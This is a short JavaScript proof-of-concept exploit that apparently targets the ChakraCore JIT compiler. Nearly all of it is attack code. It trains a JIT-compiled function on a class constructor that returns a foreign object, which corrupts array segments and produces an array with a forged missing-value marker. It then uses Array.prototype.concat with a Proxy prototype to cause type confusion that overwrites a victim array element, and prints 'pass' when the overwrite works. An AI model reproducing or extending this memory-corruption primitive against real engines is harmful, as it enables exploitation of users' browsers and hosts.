let x = {};
x.y = 0x1234;
x[0] = 1.1;x[1] = 1.1;x[2] = 1.1;x[3] = 1.1;

let evilMissingValue = [1,{},3,4];

class evil extends Object{
	constructor(arg){
		return x;
	}
}
function jit(objarray, index){
	let alias = new evil(1.1,2.2);
	alias.y;  //become definite Object ???
	objarray[0] = 1.1;
	alias[index] = 2.2;  //index 0x11 will grow the segment, but it will not kill segment sym
	evilMissingValue[2] = objarray[0];   // return from wrong segment...
									//we can use this to create a array has 0xfff80002fff80002
								//but hasMissingValue is true
}

flag = 0;
for(let i = 0;i < 2; i++){
	jit(x, 1);
}

Array.isArray([]);
flag = 1;
jit(x, 0x11);

/****************** And now, we can use this evil array to do sth interesting*********************/
//

let victim = [1.1,2.2,3.3];
victim.getPrototypeOf = Object.prototype.valueOf;
//print(1);
evilMissingValue.__proto__ = new Proxy({}, victim);

function trigger(victim, evil){
	let xxx = [1.1];
	victim[0] = 1.1;
	let result = xxx.concat(evil);
	victim[1] = 6.17651672645e-312;
}

for(let i = 0;i < 2;i++){
	trigger([1.1,2.2,3.3], [{},{}]);
}

trigger(victim, evilMissingValue);
if (victim[1] === 6.17651672645e-312)
{
    WScript.Echo('pass');
}
